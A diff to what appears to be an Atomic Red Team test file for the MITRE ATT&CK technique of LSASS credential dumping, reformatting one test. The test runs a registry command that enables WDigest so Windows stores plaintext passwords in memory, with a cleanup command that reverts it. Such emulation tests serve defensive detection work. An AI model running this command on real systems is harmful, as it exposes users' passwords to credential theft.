@@ -1,20 +1,12 @@
 attack_technique: T1003.001
 display_name: "OS Credential Dumping: LSASS Memory"
 atomic_tests:
-- name: Wdigest enable
-  auto_generated_guid:
-  descriptions: |
-    Enable Wdigest so you are able to dump clear text passwords from LSASS once workstation locks and user logs back on.
+- name: Wdigest
+  description: Enable Wdigest to allow password to be stored in clear text
   supported_platforms:
   - windows
-  input_arguments:
-    command_to_execute:
-      description:
-      type:
-      default:
-   executor:
-    command: |
-      reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+  executor:
+    command: reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
     cleanup_command: reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0
     name: command_prompt
     elevation_required: true
